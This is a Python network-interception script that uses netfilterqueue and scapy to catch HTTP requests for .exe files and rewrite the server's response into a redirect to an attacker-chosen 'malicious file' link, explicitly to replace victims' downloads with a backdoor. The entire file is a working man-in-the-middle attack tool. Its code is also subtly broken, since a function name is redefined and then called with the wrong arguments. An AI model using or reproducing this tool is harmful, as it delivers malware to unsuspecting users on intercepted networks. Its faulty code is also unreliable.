#!/usr/bin/env python
import netfilterqueue as netq
import scapy.all as scapy
import optparse

def get_args():
    parser = optparse.OptionParser()
    parser.add_option("-l", "--link", dest="mal_link", help="Download link of the malicious file.")
    (val, args) = parser.parse_args()
    if not val.mal_link:
        parser.error("ERROR Missing argument, use --help for more info")
    return val

def mod_packet(packet, link):
    packet[scapy.Raw].load = " HTTP/1.1 301 Moved Permanently\nLocation: " + link + "\n\n"
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

req_ack = []
def mod_packet(packet):
    use_packet = scapy.IP(packet.get_payload())
    if use_packet.haslayer(scapy.Raw):
        if use_packet[scapy.TCP].dport == 80:
            if ".exe" in use_packet[scapy.Raw].load:
                print("[+] Detected Download .exe file REQUEST...")
                req_ack.append(use_packet[scapy.TCP].ack)
        elif use_packet[scapy.TCP].sport == 80:
            if use_packet[scapy.TCP].seq in req_ack:
                print("[+] HTTP Response for the Download Req...#########")
                req_ack.remove(use_packet[scapy.TCP].seq)
                print("[+] Replacing Download with backdoor...")
                modified_packet = mod_packet(use_packet, value.mal_link)
                packet.set_payload(str(modified_packet))
    packet.accept()

value = get_args()
queue = netq.NetfilterQueue()
queue.bind(0, mod_packet)
queue.run()